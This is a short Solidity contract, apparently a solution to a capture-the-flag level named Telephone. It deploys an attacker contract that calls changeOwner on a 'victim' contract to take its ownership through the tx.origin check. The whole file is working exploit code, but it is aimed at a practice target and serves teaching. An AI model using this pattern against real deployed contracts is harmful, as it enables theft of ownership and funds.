pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TxAttacker {
    Telephone telContract; 

    constructor(address _victimContractAddr) public {
        telContract = Telephone(_victimContractAddr);

    }

    function hackContract(address _address) public {
        telContract.changeOwner(_address);
    }

}
